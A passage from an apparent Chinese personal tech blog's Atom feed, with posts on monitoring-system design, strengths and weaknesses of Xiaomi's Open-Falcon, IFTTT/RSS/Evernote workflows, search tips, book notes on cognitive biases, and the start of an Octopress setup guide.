&lt;li&gt;&lt;a href=&quot;https://github.com/open-falcon/book/blob/master/zh/faq/linux-metrics.md&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux运维基础采集项&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.penglixun.com/tech/system/how_to_calc_load_cpu.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;cpu idle计算原理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://melody-dc.com/2015/11/21/%E7%90%86%E8%A7%A3CPU-steal-time/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;理解CPU-steal-time&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://wendal.net/2012/1224.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在Golang中获取系统的磁盘空间内存占用&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://547502462.blog.163.com/blog/static/633048222012834230731/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;iostat 各项指标含义&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.pythian.com/blog/basic-io-monitoring-on-linux&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Basic I/O Monitoring on Linux&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;回顾：&quot;&gt;&lt;a href=&quot;#回顾：&quot; class=&quot;headerlink&quot; title=&quot;回顾：&quot;&gt;&lt;/a&gt;回顾：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.x2know.org/2016/06/28/monitor-system/&quot;&gt;企业级监控系统设计实践（一）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;数据采集&quot;&gt;&lt;a href=&quot;#数据采集&quot; class=&quot;headerlink&quot; title=&quot;数据采集&quot;&gt;&lt;/a&gt;数据采集&lt;/h1&gt;&lt;p&gt;收到数据采集，那我们主要需要哪些数据呢？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;机器的状态，cpu，内存&lt;/li&gt;
&lt;li&gt;业务自己产生的数据，如qps等&lt;/li&gt;
&lt;li&gt;mysql，redis等开源软件自身的状态数据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上面的数据大致可以分为两类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;机器指标&lt;/li&gt;
&lt;li&gt;业务数据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;采集方式也有两种：push和pull&lt;br&gt;当agent数量非常庞大时，如果采用pull的方式，server端需要保持大量的链接，非常消耗性能，所以我们采用agent push数据的方式&lt;br&gt;
    
    </summary>
    
    
      <category term="监控" scheme="http://blog.x2know.org/tags/%E7%9B%91%E6%8E%A7/"/>
    
  </entry>
  
  <entry>
    <title>企业级监控系统设计实践（一）</title>
    <link href="http://blog.x2know.org/2016/06/28/monitor-system/"/>
    <id>http://blog.x2know.org/2016/06/28/monitor-system/</id>
    <published>2016-06-27T16:00:32.000Z</published>
    <updated>2016-07-05T16:00:49.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;从公司产品上线的那一天就开始需要运维，而监控则是运维中重要的一环，那我们想一下，为什么要监控呢，因为要保证线上服务出问题之后或者即将出问题时能立刻感知，此外有些数据我们想知道它的发展趋势。这其实已经道出了监控的最小功能点：&lt;br&gt;&lt;strong&gt;收集信息，进行处理，发出提醒，数据展示&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;阶段一：&quot;&gt;&lt;a href=&quot;#阶段一：&quot; class=&quot;headerlink&quot; title=&quot;阶段一：&quot;&gt;&lt;/a&gt;阶段一：&lt;/h3&gt;&lt;p&gt;机器数量：n &amp;lt; 5&lt;br&gt;假如公司的只有一款产品部署在一台机器，那我们只要写一个监控脚本，收集机器的信息和业务指标，再加一些判断，就完事了&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;阶段二：&quot;&gt;&lt;a href=&quot;#阶段二：&quot; class=&quot;headerlink&quot; title=&quot;阶段二：&quot;&gt;&lt;/a&gt;阶段二：&lt;/h3&gt;&lt;p&gt;机器数量：5 &amp;lt; n &amp;lt; 200&lt;br&gt;那如果公司规模扩大，机器增加到50台，项目组件分别部署在不同的机器。如果还按照原来的办法，每个机器的脚本各不相同，管理起来必然非常麻烦，之前脚本的方式显然不适用了。那怎么做呢。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;自己开发一套监控系统&lt;/li&gt;
&lt;li&gt;寻找能满足需求的开源的监控系统&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;从人力成本考虑，方案一是一个比较好的选择，小米在当初就是用的开源监控系统Zabbix&lt;/p&gt;
&lt;h3 id=&quot;阶段三：&quot;&gt;&lt;a href=&quot;#阶段三：&quot; class=&quot;headerlink&quot; title=&quot;阶段三：&quot;&gt;&lt;/a&gt;阶段三：&lt;/h3&gt;&lt;p&gt;机器数量：n &amp;gt; 200&lt;br&gt;等公司规模继续扩大发展到非常大的规模，发展到5000台机器，每个机器假设有100个监控项，就是50W监控项，这样在mysql数据库储存方案就遇到了性能瓶颈，如果搭建多套zabbix，管理成本也会非常高昂。此时，就迫切需要根据公司的需求自己开发一套监控系统。下面就让我们思考下怎么开发一套监控系统。&lt;/p&gt;
&lt;h3 id=&quot;总体设计&quot;&gt;&lt;a href=&quot;#总体设计&quot; class=&quot;headerlink&quot; title=&quot;总体设计&quot;&gt;&lt;/a&gt;总体设计&lt;/h3&gt;&lt;p&gt;现在我们需要开发一套监控系统，下面就思考一下整体的架构&lt;br&gt;首先我们要收集数据，数据包括机器指标和业务产生的数据，所以我们需要一个agent采集端。&lt;br&gt;有了数据后，有两个用途：1.画趋势图  2.做告警判断&lt;br&gt;所以还需要两个组件，一个负责储存并展示历史数据，一个负责告警判断&lt;br&gt;这篇就到这里，后续文章将对三个重要组件及其拓展做更详细的讲解&lt;/p&gt;
&lt;p&gt;–End–&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;从公司产品上线的那一天就开始需要运维，而监控则是运维中重要的一环，那我们想一下，为什么要监控呢，因为要保证线上服务出问题之后或者即将出问题时能立刻感知，此外有些数据我们想知道它的发展趋势。这其实已经道出了监控的最小功能点：&lt;br&gt;&lt;strong&gt;收集信息，进行处理，发出提醒，数据展示&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;阶段一：&quot;&gt;&lt;a href=&quot;#阶段一：&quot; class=&quot;headerlink&quot; title=&quot;阶段一：&quot;&gt;&lt;/a&gt;阶段一：&lt;/h3&gt;&lt;p&gt;机器数量：n &amp;lt; 5&lt;br&gt;假如公司的只有一款产品部署在一台机器，那我们只要写一个监控脚本，收集机器的信息和业务指标，再加一些判断，就完事了&lt;br&gt;
    
    </summary>
    
    
      <category term="监控" scheme="http://blog.x2know.org/tags/%E7%9B%91%E6%8E%A7/"/>
    
  </entry>
  
  <entry>
    <title>小米监控系统falcon优点和缺点</title>
    <link href="http://blog.x2know.org/2016/06/25/open-falcon/"/>
    <id>http://blog.x2know.org/2016/06/25/open-falcon/</id>
    <published>2016-06-25T13:40:23.000Z</published>
    <updated>2016-08-19T15:54:41.000Z</updated>
    
    <content type="html">&lt;p&gt;参与开发和维护小米的falcon系统也有挺长时间了，总结一下falcon的一些优点和缺点。如果对falcon不了解，建议先对下这篇文章《&lt;a href=&quot;http://book.open-falcon.org/zh/intro/index.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;open-falcon介绍&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;先说下具备的优势：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;灵活的数据采集，支持自定义数据上报&lt;/li&gt;
&lt;li&gt;支持策略模板、模板继承和覆盖&lt;/li&gt;
&lt;li&gt;高效的告警判别，支持告警暂停、维护周期设置&lt;/li&gt;
&lt;li&gt;组件支持水平拓展&lt;/li&gt;
&lt;li&gt;大部分用golang编写，部署相对简单&lt;/li&gt;
&lt;/ul&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;说了优点，下面说说缺点以及改进方案&lt;/p&gt;
&lt;h3 id=&quot;对上报数据没有做限制&quot;&gt;&lt;a href=&quot;#对上报数据没有做限制&quot; class=&quot;headerlink&quot; title=&quot;对上报数据没有做限制&quot;&gt;&lt;/a&gt;对上报数据没有做限制&lt;/h3&gt;&lt;p&gt;当时处于是内部系统的考虑就没有做权限方面的控制，现在发现如果用户操作失误，短时间内推送大量数据，对后端graph会产生很大的压力。所以权限这块要进行加强。&lt;br&gt;&lt;strong&gt;解决方案：&lt;/strong&gt;&lt;br&gt;上报指标和告警接收组绑定，每个告警接收组限定一个上报counter数，超出限额的部分不在接收。&lt;/p&gt;
&lt;h3 id=&quot;策略模板继承和覆盖计算消耗大量资源&quot;&gt;&lt;a href=&quot;#策略模板继承和覆盖计算消耗大量资源&quot; class=&quot;headerlink&quot; title=&quot;策略模板继承和覆盖计算消耗大量资源&quot;&gt;&lt;/a&gt;策略模板继承和覆盖计算消耗大量资源&lt;/h3&gt;&lt;p&gt;目前每个周期judge从hbs获取策略时，所有策略的继承都要从新计算一遍，消耗大量cpu资源。&lt;br&gt;&lt;strong&gt;解决方案：&lt;/strong&gt;&lt;br&gt;由全量计算改为触发计算，新建一张表，记录父模板和子模板的对应关系，策略只要一发生改变，就立即找此模板对应的所有子模板，一直遍历下去，直到没有子模板为止，将和此父模板相关的策略全部修改为最新策略，这样下次获取到的策略都是计算好的，直接从数据库读取即可，减少了cpu计算量&lt;/p&gt;
&lt;h3 id=&quot;nodata容易误报&quot;&gt;&lt;a href=&quot;#nodata容易误报&quot; class=&quot;headerlink&quot; title=&quot;nodata容易误报&quot;&gt;&lt;/a&gt;nodata容易误报&lt;/h3&gt;&lt;p&gt;现在nodate的处理逻辑是这样的，falcon-agent每个周期，会上报一个aagent.alive=1的指标，nodata每个周期会从后端历史数据接口获取最近一个点agent.alive的数据，如果获取不到，则自动上报一个agent.alive=1，这里会有一个问题，如果agent上报有延迟，在nodata查询的时候，数据还没上去，nodata会上报一个agent.alive=0，而后上报的agent.alive=1则会被丢弃，造成误报。&lt;br&gt;&lt;strong&gt;解决方案&lt;/strong&gt;：&lt;br&gt;之前nodata的方案需要数据重新从transfer到judge再走一遍。数据链路太长，新的方案直接通过judge组件完成，由judge维护一个上报数据来源的hostname列表，由于judge的每个counter都会保留最近的10点，所以通过hostname+agent.alive能拿到最近的数据点，如果当前时间点减去最近的时间点大于3个周期的时间，则基本可以说明数据已经不再上报了，然后触发一次告警判别，这种方案能很好的解决误报问题。&lt;/p&gt;
&lt;h3 id=&quot;用户的一些操作权限设置不合理&quot;&gt;&lt;a href=&quot;#用户的一些操作权限设置不合理&quot; class=&quot;headerlink&quot; title=&quot;用户的一些操作权限设置不合理&quot;&gt;&lt;/a&gt;用户的一些操作权限设置不合理&lt;/h3&gt;&lt;p&gt;用户配置的策略只有自己可以修改，screen所有人都可以修改，有同事离职了，想做修改，需要直接操作数据库，这样很不好。&lt;br&gt;&lt;strong&gt;解决方案&lt;/strong&gt;：&lt;br&gt;用户在web端的所有操作都和所在的team绑定，同一个team的人可以修改，查看team对应的资源。&lt;/p&gt;
&lt;h3 id=&quot;没有告警升级&quot;&gt;&lt;a href=&quot;#没有告警升级&quot; class=&quot;headerlink&quot; title=&quot;没有告警升级&quot;&gt;&lt;/a&gt;没有告警升级&lt;/h3&gt;&lt;p&gt;告警触发后，如果没人响应，达到最大报警次数后，有被忽略的风险。如果告警触发后，经过一段时间没有恢复，继续发给另一批人，再次对相关人员进行提醒。&lt;br&gt;&lt;strong&gt;解决方案&lt;/strong&gt;：&lt;br&gt;这个还没想到很好的解决方案，欢迎讨论: )&lt;/p&gt;
&lt;h3 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;参考&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.jianshu.com/p/623b96175915&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Open-Falcon存在的问题，重写一套&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://book.open-falcon.org/zh/intro/index.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Open-Falcon介绍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;参与开发和维护小米的falcon系统也有挺长时间了，总结一下falcon的一些优点和缺点。如果对falcon不了解，建议先对下这篇文章《&lt;a href=&quot;http://book.open-falcon.org/zh/intro/index.html&quot;&gt;open-falcon介绍&lt;/a&gt;》&lt;/p&gt;
&lt;p&gt;先说下具备的优势：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;灵活的数据采集，支持自定义数据上报&lt;/li&gt;
&lt;li&gt;支持策略模板、模板继承和覆盖&lt;/li&gt;
&lt;li&gt;高效的告警判别，支持告警暂停、维护周期设置&lt;/li&gt;
&lt;li&gt;组件支持水平拓展&lt;/li&gt;
&lt;li&gt;大部分用golang编写，部署相对简单&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>利用 IFTTT + RSS + Evernote 打造优质资料库</title>
    <link href="http://blog.x2know.org/2015/09/21/ifttt-rss-evernote/"/>
    <id>http://blog.x2know.org/2015/09/21/ifttt-rss-evernote/</id>
    <published>2015-09-21T14:07:22.000Z</published>
    <updated>2016-05-28T11:39:32.000Z</updated>
    
    <content type="html">&lt;p&gt;如今信息浩瀚如海，怎样从中筛选优质信息并化为自己的呢，下面介绍三个利器，通过他们打造自己的优质资料库&lt;/p&gt;
&lt;p&gt;我们每天主要的信息来源有下面几大类&lt;br&gt;1.博客&lt;br&gt;2.微信公众账号&lt;br&gt;3.微博&lt;br&gt;4.twitter&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;现在每天都把上面这些信息浏览一遍，会花费大量的时间，但不看又觉得会错过重要的知识，那怎么办呢，在发现ifttt后突然想到了解决办法。将一些优质的信息源转化为RSS，通过IFTTT将其转存到Evernote中，当我们以后学习或找资料时，去Evernote中搜索即可。&lt;/p&gt;
&lt;p&gt;一、将信息源转为RSS    &lt;/p&gt;
&lt;p&gt;1.将微信公众账号转为RSS&lt;br&gt;方法看这里：&lt;a href=&quot;http://www.zhihu.com/question/26352320&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.zhihu.com/question/26352320&lt;/a&gt;&lt;br&gt;2.将微博转为RSS&lt;br&gt;方法看这里：&lt;a href=&quot;http://www.zhihu.com/question/20736965&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.zhihu.com/question/20736965&lt;/a&gt;&lt;br&gt;3.将twitter转化为rss&lt;br&gt;可以用这个：&lt;a href=&quot;https://twitrss.me&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://twitrss.me&lt;/a&gt;        &lt;/p&gt;
&lt;p&gt;二、将RSS内容储存到Evernote中                &lt;/p&gt;
&lt;p&gt;具体过程就不写了,简单说下流程:&lt;br&gt;1.去IFTTT注册一个账户&lt;br&gt;2.点击添加recipe&lt;br&gt;3.找到feed&lt;br&gt;4.添加rss&lt;br&gt;5.找到evernote         &lt;/p&gt;
&lt;p&gt;优质资料库打造完成！&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;如今信息浩瀚如海，怎样从中筛选优质信息并化为自己的呢，下面介绍三个利器，通过他们打造自己的优质资料库&lt;/p&gt;
&lt;p&gt;我们每天主要的信息来源有下面几大类&lt;br&gt;1.博客&lt;br&gt;2.微信公众账号&lt;br&gt;3.微博&lt;br&gt;4.twitter&lt;br&gt;
    
    </summary>
    
      <category term="推荐" scheme="http://blog.x2know.org/categories/%E6%8E%A8%E8%8D%90/"/>
    
    
  </entry>
  
  <entry>
    <title>如何高效地搜索</title>
    <link href="http://blog.x2know.org/2015/08/25/search-skill/"/>
    <id>http://blog.x2know.org/2015/08/25/search-skill/</id>
    <published>2015-08-25T13:44:02.000Z</published>
    <updated>2016-05-28T12:11:20.000Z</updated>
    
    <content type="html">&lt;p&gt;如今信息浩瀚如海，怎样高效地利用搜索去寻找想要的资料已经成为一项重要的技能，分享一些多年来使用搜索的经验和技巧，希望能帮到大家&lt;/p&gt;
&lt;h1 id=&quot;全网搜索，首选Google&quot;&gt;&lt;a href=&quot;#全网搜索，首选Google&quot; class=&quot;headerlink&quot; title=&quot;全网搜索，首选Google&quot;&gt;&lt;/a&gt;全网搜索，首选Google&lt;/h1&gt;&lt;p&gt;先介绍几个google常用的搜索技巧&lt;/p&gt;
&lt;h5 id=&quot;site-xx-com-关键字&quot;&gt;&lt;a href=&quot;#site-xx-com-关键字&quot; class=&quot;headerlink&quot; title=&quot;site:xx.com + 关键字&quot;&gt;&lt;/a&gt;site:xx.com + 关键字&lt;/h5&gt;&lt;p&gt;通常网站自带的搜索，准确率都很低，这时候可以使用site:a.com+关键字的形式通过google去搜索效果很明显&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h5 id=&quot;双引号，加号，减号&quot;&gt;&lt;a href=&quot;#双引号，加号，减号&quot; class=&quot;headerlink&quot; title=&quot;双引号，加号，减号&quot;&gt;&lt;/a&gt;双引号，加号，减号&lt;/h5&gt;&lt;p&gt;双引号可以将一个词组作为一个整体&lt;br&gt;加号强制链接的词在结果中都要出现&lt;br&gt;减号在搜索结果中剔除包涵减去关键字的页面&lt;/p&gt;
&lt;h5 id=&quot;google-com-ncr&quot;&gt;&lt;a href=&quot;#google-com-ncr&quot; class=&quot;headerlink&quot; title=&quot;google.com/ncr&quot;&gt;&lt;/a&gt;google.com/ncr&lt;/h5&gt;&lt;p&gt;在地址后面加”ncr”，取消地域限制&lt;/p&gt;
&lt;h5 id=&quot;注意关键字&quot;&gt;&lt;a href=&quot;#注意关键字&quot; class=&quot;headerlink&quot; title=&quot;注意关键字&quot;&gt;&lt;/a&gt;注意关键字&lt;/h5&gt;&lt;p&gt;没有低级的魔法，只有低级的魔法师，当搜索不到想要的东西时，可能是关键字错了，不妨换个思路：）&lt;/p&gt;
&lt;h5 id=&quot;google自定义搜索&quot;&gt;&lt;a href=&quot;#google自定义搜索&quot; class=&quot;headerlink&quot; title=&quot;google自定义搜索&quot;&gt;&lt;/a&gt;google自定义搜索&lt;/h5&gt;&lt;p&gt;将某一个垂直领域的网站，博客收录到一个cse中，通过自定义搜索，可以使信息的精准度大大提高&lt;/p&gt;
&lt;h5 id=&quot;剪藏相关搜索&quot;&gt;&lt;a href=&quot;#剪藏相关搜索&quot; class=&quot;headerlink&quot; title=&quot;剪藏相关搜索&quot;&gt;&lt;/a&gt;剪藏相关搜索&lt;/h5&gt;&lt;p&gt;安装剪藏插件，打开相关搜索功能，将evernote的笔记融入到搜索结果中。&lt;/p&gt;
&lt;h1 id=&quot;接下来介绍其他几个好用搜索&quot;&gt;&lt;a href=&quot;#接下来介绍其他几个好用搜索&quot; class=&quot;headerlink&quot; title=&quot;接下来介绍其他几个好用搜索&quot;&gt;&lt;/a&gt;接下来介绍其他几个好用搜索&lt;/h1&gt;&lt;h5 id=&quot;Ctrl-F-全网页搜索&quot;&gt;&lt;a href=&quot;#Ctrl-F-全网页搜索&quot; class=&quot;headerlink&quot; title=&quot;Ctrl + F 全网页搜索&quot;&gt;&lt;/a&gt;Ctrl + F 全网页搜索&lt;/h5&gt;&lt;p&gt;全速定位想要查看的关键字&lt;/p&gt;
&lt;h5 id=&quot;Weibo搜索&quot;&gt;&lt;a href=&quot;#Weibo搜索&quot; class=&quot;headerlink&quot; title=&quot;Weibo搜索&quot;&gt;&lt;/a&gt;Weibo搜索&lt;/h5&gt;&lt;p&gt;当想了解实时信息，重要新闻时，微博搜索非常方便&lt;/p&gt;
&lt;h5 id=&quot;Evernote搜索&quot;&gt;&lt;a href=&quot;#Evernote搜索&quot; class=&quot;headerlink&quot; title=&quot;Evernote搜索&quot;&gt;&lt;/a&gt;Evernote搜索&lt;/h5&gt;&lt;p&gt;evernote已经成为打造个人优质资料库的利器，日常收集优质的资料，通过搜索让它们发挥作用，怎样收集优质的资料，这个改天单独写一篇。&lt;/p&gt;
&lt;h5 id=&quot;搜狗微信搜索&quot;&gt;&lt;a href=&quot;#搜狗微信搜索&quot; class=&quot;headerlink&quot; title=&quot;搜狗微信搜索&quot;&gt;&lt;/a&gt;搜狗微信搜索&lt;/h5&gt;&lt;p&gt;微信公众账号越来越丰富，使其也成为一个重要的信息来源，我不会告诉你，找电影资源很方便哦。&lt;/p&gt;
&lt;p&gt;如果上面的一些东西还没使用过，赶紧用起来吧。&lt;/p&gt;
&lt;h4 id=&quot;Life-is-short，you-need-search&quot;&gt;&lt;a href=&quot;#Life-is-short，you-need-search&quot; class=&quot;headerlink&quot; title=&quot;Life is short，you need search&quot;&gt;&lt;/a&gt;Life is short，you need search&lt;/h4&gt;</content>
    
    <summary type="html">
    
      &lt;p&gt;如今信息浩瀚如海，怎样高效地利用搜索去寻找想要的资料已经成为一项重要的技能，分享一些多年来使用搜索的经验和技巧，希望能帮到大家&lt;/p&gt;
&lt;h1 id=&quot;全网搜索，首选Google&quot;&gt;&lt;a href=&quot;#全网搜索，首选Google&quot; class=&quot;headerlink&quot; title=&quot;全网搜索，首选Google&quot;&gt;&lt;/a&gt;全网搜索，首选Google&lt;/h1&gt;&lt;p&gt;先介绍几个google常用的搜索技巧&lt;/p&gt;
&lt;h5 id=&quot;site-xx-com-关键字&quot;&gt;&lt;a href=&quot;#site-xx-com-关键字&quot; class=&quot;headerlink&quot; title=&quot;site:xx.com + 关键字&quot;&gt;&lt;/a&gt;site:xx.com + 关键字&lt;/h5&gt;&lt;p&gt;通常网站自带的搜索，准确率都很低，这时候可以使用site:a.com+关键字的形式通过google去搜索效果很明显&lt;br&gt;
    
    </summary>
    
      <category term="推荐" scheme="http://blog.x2know.org/categories/%E6%8E%A8%E8%8D%90/"/>
    
    
  </entry>
  
  <entry>
    <title>程序员的思维修炼 读书笔记</title>
    <link href="http://blog.x2know.org/2015/08/17/pragmatic-thinking-and-learning/"/>
    <id>http://blog.x2know.org/2015/08/17/pragmatic-thinking-and-learning/</id>
    <published>2015-08-17T13:37:47.000Z</published>
    <updated>2016-05-28T11:38:57.000Z</updated>
    
    <content type="html">&lt;p&gt;虽然这本书是名字叫“程序员的思维修炼”，但普通人也值得一看，书中对大脑的机制和认知偏见做了很好的讲解，这里简单记录下，主要是第三章到第五章的内容&lt;/p&gt;
&lt;p&gt;###关于大脑的机制&lt;br&gt;我们两个半脑工作机制有很大不同，这个我们是知道的，但书中关于总线的隐喻比较新颖，大脑由两个cpu，一个总线，一个内存构成&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;左脑负责线性，逻辑思维和语言功能，书中把这种模式成为线性模式，简称L模式&lt;br&gt;右脑负责搜索，模式匹配，图像等功能，书中把这种模式称为富模式，简称R模式   &lt;/p&gt;
&lt;p&gt;我们经常使用的是L型思维，R型思维经常被忽略，但我们经常会遇到的灵光一现，这个就是R型思维在起作用。因此书中强调了R型思维的重要性，花了很大篇幅讲怎样更好的利用R型思维。&lt;br&gt;简单列举下锻炼R型思维的方法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;画画&lt;br&gt;写作&lt;br&gt;散步&lt;br&gt;讲笑话&lt;br&gt;启动多感官输入   &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;书中提到我们的两个半球脑可以同时工作，但很难共享总线，以至于我们的行动要么是L型在发挥作用，要么是R型在发挥作用。一个很好的例子就是当我们睡醒时，对晚上做的梦有清晰的记忆，但当我们想用语言描述时，他就变得模糊了，因为此时R型脑被L型脑替代。然后书中给出了一个让两个大脑共享总线的办法：&lt;strong&gt;使用隐喻，强大的隐喻可以使两个脑模式互通，激发出创造力。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;关于认知偏见&quot;&gt;&lt;a href=&quot;#关于认知偏见&quot; class=&quot;headerlink&quot; title=&quot;关于认知偏见&quot;&gt;&lt;/a&gt;关于认知偏见&lt;/h3&gt;&lt;h4 id=&quot;基本归因错误&quot;&gt;&lt;a href=&quot;#基本归因错误&quot; class=&quot;headerlink&quot; title=&quot;基本归因错误&quot;&gt;&lt;/a&gt;基本归因错误&lt;/h4&gt;&lt;p&gt;我们倾向于把别人的行为归因于他们的个性，而不去考虑行为发生时的情景，一个各方面都正常的人有时也会做出极端的事情，例如偷盗，行为经常是对情景的响应而不是个人的性格使然。仔细想想，确实有时会被这种偏见误导。&lt;/p&gt;
&lt;h4 id=&quot;二阶不胜任&quot;&gt;&lt;a href=&quot;#二阶不胜任&quot; class=&quot;headerlink&quot; title=&quot;二阶不胜任&quot;&gt;&lt;/a&gt;二阶不胜任&lt;/h4&gt;&lt;h5 id=&quot;一个人对自己的了解可以分为四类：&quot;&gt;&lt;a href=&quot;#一个人对自己的了解可以分为四类：&quot; class=&quot;headerlink&quot; title=&quot;一个人对自己的了解可以分为四类：&quot;&gt;&lt;/a&gt;一个人对自己的了解可以分为四类：&lt;/h5&gt;&lt;p&gt;知道自己知道&lt;br&gt;不知道自己知道&lt;br&gt;知道自己不知道&lt;br&gt;不知道自己不知道   &lt;/p&gt;
&lt;p&gt;这个很好的说明了为什么有很多领域的新人会很自大，因为他不知道自己不知道的有很多。所以要经常审视自己，尽量避免这种情况&lt;/p&gt;
&lt;h4 id=&quot;认可偏见&quot;&gt;&lt;a href=&quot;#认可偏见&quot; class=&quot;headerlink&quot; title=&quot;认可偏见&quot;&gt;&lt;/a&gt;认可偏见&lt;/h4&gt;&lt;p&gt;我们只看到我们想看到的，以此来印证自己的观点&lt;/p&gt;
&lt;p&gt;喜欢一个人，就会越来越喜欢，因为会不断的去找他的优点&lt;br&gt;讨厌一个人，会越来越讨厌他，因为会不断的去找他的缺点   &lt;/p&gt;
&lt;p&gt;当发现自己有些反感某个人时，要警惕起来，想想是否过去只关注那个人的缺点，而对他的优点视而不见。&lt;br&gt;维基百科有一个关于认知偏见的&lt;a href=&quot;https://en.wikipedia.org/wiki/Cognitive_bias&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;词条&lt;/a&gt;，有兴趣可以看下&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;虽然这本书是名字叫“程序员的思维修炼”，但普通人也值得一看，书中对大脑的机制和认知偏见做了很好的讲解，这里简单记录下，主要是第三章到第五章的内容&lt;/p&gt;
&lt;p&gt;###关于大脑的机制&lt;br&gt;我们两个半脑工作机制有很大不同，这个我们是知道的，但书中关于总线的隐喻比较新颖，大脑由两个cpu，一个总线，一个内存构成&lt;br&gt;
    
    </summary>
    
      <category term="读书" scheme="http://blog.x2know.org/categories/%E8%AF%BB%E4%B9%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>用Octopress搭建博客</title>
    <link href="http://blog.x2know.org/2014/09/14/an-zhuang-octopress/"/>
    <id>http://blog.x2know.org/2014/09/14/an-zhuang-octopress/</id>
    <published>2014-09-14T05:01:14.000Z</published>
    <updated>2016-08-10T13:49:06.000Z</updated>
    
    <content type="html">&lt;p&gt;博客以前一直放在BAE上，最近突然博客打不开了，发现原来BAE2.0的所有应用都下线了。。一直觉得Octopress不错，于是决定用Octopress+Github搭建一个博客，记录下搭建过程&lt;/p&gt;
&lt;p&gt;我是在Ubuntu下安装的Octopress，参考的下面这篇文章&lt;br&gt;&lt;a href=&quot;https://www.jeremymorgan.com/tutorials/linux/how-to-install-octopress-on-ubuntu-linux-quantal-quetzal/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;How to Install Octopress on Ubuntu Linux&lt;/a&gt;&lt;br&gt;怎样将文章推送到github参考下面这篇文章&lt;br&gt;&lt;a href=&quot;http://blog.devtang.com/blog/2012/02/10/setup-blog-based-on-github/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;象写程序一样写博客：搭建基于github的博客&lt;/a&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;下面是过程中遇到的问题以及解决方法&lt;/p&gt;
&lt;p&gt;问题1：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;! [rejected]        master -&amp;gt; master (non-fast-forward)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
